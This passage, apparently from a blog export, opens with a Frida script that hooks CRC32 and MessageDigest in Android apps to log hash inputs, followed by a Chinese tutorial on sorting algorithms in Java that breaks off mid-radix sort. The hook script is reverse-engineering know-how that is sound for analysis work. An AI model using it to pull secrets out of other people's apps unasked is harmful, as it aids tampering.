<h1 id="hookhash"><a href="#hookhash" class="headerlink" title="hookhash"></a>hookhash</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookCRC32</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">CRC32Class</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.zip.CRC32&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32 constructor function is called&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>.$init();</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;update:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.nio.ByteBuffer&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;update.overload(&#x27;java.nio.ByteBuffer&#x27;):&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;update.overload(&#x27;int&#x27;):&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;update.overload(&#x27;int&#x27;, &#x27;int&#x27;):&quot;</span>, arg0, <span class="string">&#x27;---&#x27;</span>, arg1);</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0, arg1);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1, arg2</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;update:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0), <span class="string">&quot;---:&quot;</span>, <span class="string">&quot;---&quot;</span>, arg1, <span class="string">&quot;---&quot;</span>, arg2);</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0, arg1, arg2);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">CRC32Class</span>.<span class="property">getValue</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getValue</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CRC32-&gt;getValue:&quot;</span>, result);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookmd5andsha</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">MessageDigestClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>);</span><br><span class="line">            <span class="title class_">MessageDigestClass</span>.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MessageDigest-&gt;getInstance:&quot;</span>, arg0);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(arg0);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title class_">MessageDigestClass</span>.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                <span class="comment">//var StringClass=Java.use(&quot;java.lang.String&quot;);</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MessageDigestClass-&gt;update:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">                <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(arg0);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//hookCRC32();</span></span><br><span class="line">    <span class="title function_">hookmd5andsha</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Android安全</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>排序</title>
    <url>/2022/06/01/%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Bubble-sort"><a href="#Bubble-sort" class="headerlink" title="Bubble sort"></a>Bubble sort</h1><blockquote>
<p>分为向前冒泡，还是向后冒。</p>
</blockquote>
<p>原理：比较相邻得两个元素，如果前者大于后者，则交换两个得顺序，一趟遍历之后，最后一个位置得元素得值是最大的。</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;j&lt;nums.length-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]&lt;nums[j-<span class="number">1</span>])&#123;</span><br><span class="line">                swap(nums,j,j-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="selection-sort"><a href="#selection-sort" class="headerlink" title="selection sort"></a>selection sort</h1><p>原理：每一次在数组中找到一个最大的或者最小的值，放在一个特定的位置，比如数组头或者数组尾</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">selectionSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>;j&lt;nums.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]&lt;nums[index])&#123;</span><br><span class="line">                <span class="comment">//找到一个最小的元素，放在前面，升序</span></span><br><span class="line">                index = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(nums,i,index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="insertion-sort"><a href="#insertion-sort" class="headerlink" title="insertion sort"></a>insertion sort</h1><p>原理：将待排序的元素插入到已经有序的元素中，也就是说，会涉及到元素的移动等问题</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line"><span class="comment">//单个元素视为是有序的,假设整个数组需要的是升序排序</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i-<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//因为值是会覆盖的，所以需要的保存下来</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[i];</span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; nums[j]&gt;temp)&#123;</span><br><span class="line">            nums[j+<span class="number">1</span>] = nums[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[j+<span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Shell-sort"><a href="#Shell-sort" class="headerlink" title="Shell sort"></a>Shell sort</h1><blockquote>
<p> 是简单插入排序的升级，为了减少数据移动的次数，进行了增量。又叫缩小增量排序。</p>
</blockquote>
<p>原理：</p>
<ul>
<li><p>将整个待排序的数据分为若干个子序列，然后分别进行插入排序。</p>
</li>
<li><p>选择一个增量序列：t1, t2, …, tk, ti&gt;tj,tk&#x3D;1  增量是从大到小，最后为1</p>
</li>
<li><p>对于每一趟排序，根据对应的增量，将子序列进行插入排序，</p>
</li>
<li><p>当增量为1的时候，是最后一趟</p>
</li>
</ul>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line"><span class="comment">//假设需要的是升序排序</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor(n/<span class="number">2</span>); gap&gt;<span class="number">0</span>; gap = (<span class="type">int</span>) Math.floor(gap/<span class="number">2</span>))&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> gap;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[i];</span><br><span class="line">                <span class="keyword">while</span>(j-gap&gt;=<span class="number">0</span> &amp;&amp; nums[j-gap] &gt; temp)&#123;</span><br><span class="line">                    nums[j] = nums[j-gap];</span><br><span class="line">                    j -= gap;</span><br><span class="line">                &#125;</span><br><span class="line">                nums[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="merge-sort"><a href="#merge-sort" class="headerlink" title="merge sort"></a>merge sort</h1><p>思想：</p>
<blockquote>
<p>分治的思想，先分后合并为有序</p>
</blockquote>
<p>原理：</p>
<ul>
<li>将待排序元素分为两半</li>
<li>将两个子序列采用归并排序（也就是说再分）</li>
<li>将排序好的子序列进行合并</li>
</ul>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span> []nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start&gt;=end)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span>start + (end-start)/<span class="number">2</span>;</span><br><span class="line">    mergeSort(nums,start,mid);</span><br><span class="line">    mergeSort(nums,mid+<span class="number">1</span>,end);</span><br><span class="line">    merge(nums,start,mid,end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> []nums,<span class="type">int</span> start,<span class="type">int</span> mid,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;</span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> mid+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[end-start+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=end)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]&gt;nums[j])&#123;</span><br><span class="line">            temp[k++] = nums[j++];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            temp[k++] = nums[i++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)&#123;</span><br><span class="line">        temp[k++] = nums[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=end)&#123;</span><br><span class="line">        temp[k++] = nums[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(start&lt;=end)&#123;</span><br><span class="line">        nums[start++] = temp[k++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="quick-sort"><a href="#quick-sort" class="headerlink" title="quick sort"></a>quick sort</h1><p>思想：</p>
<blockquote>
<p>每一趟排序会确定一个元素的位置，使得他前面的元素都比他小，后面的元素都比他大（假设是升序）。将整体的元素分为两个部分，然后再对者两个部分进行快速排序</p>
</blockquote>
<p>原理：</p>
<ul>
<li>将待排序的元素的第一个位置作为哨兵：pivot</li>
<li>用两个指针i，j, 将其指针元素与哨兵相比较，</li>
<li>如果nums[i]&gt;pivot,则交换 i，j位置的元素，j–;</li>
<li>如果nums[i]&lt;pivot,则交换 i，j位置的元素，i++;</li>
<li>然后分别对两个序列的元素进行快速排序。</li>
</ul>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[]nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start&gt;=end)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">partitionIndex</span> <span class="operator">=</span> partition(nums,start,end);</span><br><span class="line">    quickSort(nums,start,partitionIndex-<span class="number">1</span>);</span><br><span class="line">    quickSort(nums,partitionIndex+<span class="number">1</span>,end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">partition</span><span class="params">(<span class="type">int</span> []nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pivot</span> <span class="operator">=</span> nums[start];</span><br><span class="line">    <span class="comment">// start++;,这里是不能家的，因为需要覆盖值，如果加了就回出错</span></span><br><span class="line">    <span class="keyword">while</span>(start&lt;end)&#123;</span><br><span class="line">        <span class="keyword">while</span>(nums[end]&gt;=pivot &amp;&amp; start&lt;end)&#123;</span><br><span class="line">            <span class="comment">//从后向前判断，因为有了哨兵，所以是可以直接覆盖的</span></span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[start] = nums[end];</span><br><span class="line">        <span class="keyword">while</span>(nums[start]&lt;=pivot &amp;&amp; start&lt;end)&#123;</span><br><span class="line">            <span class="comment">//从前向后</span></span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[end] = nums[start];</span><br><span class="line">    &#125;</span><br><span class="line">    nums[start] = pivot;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="heap-sort"><a href="#heap-sort" class="headerlink" title="heap sort"></a>heap sort</h1><p><strong>将待排序的数组看作是一个完全二叉树</strong></p>
<p>大顶堆特点：根节点是最大的，但是左右孩子节点的大小关系没有什么要求</p>
<p>思想：</p>
<blockquote>
<p>从最后一个节点的父节点，也就是最后一个非叶子节点来调整元素顺序，直到将最大的一个元素换到了根节点，至此一个大顶堆就构建完成，然后交换根节点和最后一个节点的值，再对根节点进行调整，重复上面的步骤即可</p>
</blockquote>
<p>步骤：</p>
<ol>
<li>构建大顶堆：从第一个非叶子节点开始堆元素数据进行调整</li>
<li>如果当前元素需要和子节点进行交换，交换之后，还需要对字节点进行堆调整，因为子节点的数据已经变了</li>
<li>构建完成之后，根节点是最大的</li>
<li>然后需要将根节点和待排序的元素的最后一个节点进行交换，待排序的元素个数–；</li>
<li>然后从根节点开始调整（只有根节点的值是变化了的）</li>
</ol>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建的是大顶堆，大顶堆，升序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums 待排序数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="comment">//构建好了一个大顶堆</span></span><br><span class="line">    buildMaxHeap(nums,n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="comment">//根节点的值最大，需要和最后一个节点进行交换</span></span><br><span class="line">        swap(nums,i,<span class="number">0</span>);</span><br><span class="line">        n--;</span><br><span class="line">        <span class="comment">//然后调整剩下的节点，</span></span><br><span class="line">        <span class="comment">//因为前面已经构建好了大顶堆，而且交换了数据之后，只有第一个元素是可能不符合大顶堆性质，</span></span><br><span class="line">        <span class="comment">// 所以只用从这个节点开始进行调整即可</span></span><br><span class="line">        adjustHeap(nums,<span class="number">0</span>,n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建大顶堆，也就是说，根节点的元素是最大的，根节点的元素大于左右孩子节点的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n 表示总的待排序元素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildMaxHeap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (n-<span class="number">1</span>)/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="comment">//调整的时候是需要从最后一个节点的父节点开始调整，</span></span><br><span class="line">        adjustHeap(nums,i,n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调整堆，如果当前节点对于孩子节点来说不是最大的，则需要交换，将最大的值换到根节点去</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> i 挑战的当前根节点的下标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n 待排序的元素的个数，也就是无序的数组元素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">adjustHeap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">2</span>*i +<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">2</span>*i +<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lagesIndex</span> <span class="operator">=</span> i;</span><br><span class="line">    <span class="keyword">if</span>(left&lt;n &amp;&amp; nums[left]&gt;nums[lagesIndex])&#123;</span><br><span class="line">        lagesIndex = left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(right&lt;n&amp;&amp; nums[right]&gt;nums[lagesIndex])&#123;</span><br><span class="line">        lagesIndex = right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(lagesIndex!=i)&#123;</span><br><span class="line">        <span class="comment">//需要交换数据</span></span><br><span class="line">        swap(nums,i,lagesIndex);</span><br><span class="line">        <span class="comment">//并且由于将父节点与孩子节点交换了，所以孩子节点的值是有所变化的，需要再次进行调整堆，孩子节点</span></span><br><span class="line">        adjustHeap(nums,lagesIndex,n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> lagesIndex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[i];</span><br><span class="line">    nums[i] = nums[lagesIndex];</span><br><span class="line">    nums[lagesIndex] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="countting-sort"><a href="#countting-sort" class="headerlink" title="countting sort"></a>countting sort</h1><p>思想：</p>
<blockquote>
<p>为待排序的数组重新申请额外的空间，并且待排序的数组是有一个确定的范围</p>
</blockquote>
<p>步骤：</p>
<ol>
<li>找出待排序的元素中的最大值和最小值</li>
<li>统计数组中每一个值为i的元素出现的次数，然后temp[i] ++;</li>
<li>累加temp</li>
<li>反向填充目标数组，将每个元素依次放入原来的数组的位置，同时temp[i]–;</li>
</ol>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">countingSort</span><span class="params">(<span class="type">int</span> []nums)</span>&#123;</span><br><span class="line">    <span class="comment">//这里可以是最大值-最小值+1</span></span><br><span class="line">    <span class="type">int</span> temp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        temp[nums[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;temp.length;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(temp[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            nums[k] = i;</span><br><span class="line">            k++;</span><br><span class="line">            temp[i]--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="bucket-sort"><a href="#bucket-sort" class="headerlink" title="bucket sort"></a>bucket sort</h1><p>思想：</p>
<blockquote>
<p>算是计数排序的升级，他们两个都是需要额外申请空间，只不过计数排序是确定了所有数都是整数，并且范围一定，只用存入每个数的数量，</p>
<p>而桶排序则是需要将原本的数据放入桶中，至于怎么放入一个桶，就需要看情况定了</p>
<p>然后还需要堆每一个桶内元素进行排序，最后拼接数据即可</p>
</blockquote>
<h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><p>注意：基数排序是先按照低位的顺序来进行排序的，然后再按照高位进行排序，因为最后的排序是权重最大的。</p>
<p>步骤：</p>
<ol>
<li>更具数组中的最大数来确定需要派个几次</li>
<li>从最低位开始将每个数放入一个特定的数组temp中</li>
<li>将temp中的元素填回原来的数组，</li>
<li>然后在对高位的数据重复上面的操作。</li>
</ol>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">     <span class="comment">// 1. 得到数组中的最大值，并获取到该值的位数。用于循环几轮</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> num : arr) &#123;</span><br><span class="line">         max = Math.max(max,num);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 得到位数</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> (max + <span class="string">&quot;&quot;</span>).length();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 定义桶 和 标识桶中元素个数</span></span><br><span class="line">     <span class="type">int</span>[][] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line">     <span class="type">int</span>[] bucketCounts = <span class="keyword">new</span> <span class="title class_">int</span>[bucket.length];</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 总共需要进行 maxLength 轮</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">1</span>, n = <span class="number">1</span>; k &lt;= maxLength; k++, n *= <span class="number">10</span>) &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">             <span class="comment">// 取到位数，得到桶的下标</span></span><br><span class="line">             <span class="type">int</span> <span class="variable">bucketIndex</span> <span class="operator">=</span> arr[i] / n % <span class="number">10</span>;</span><br><span class="line">             bucket[bucketIndex][bucketCounts[bucketIndex]] = arr[i];</span><br><span class="line">             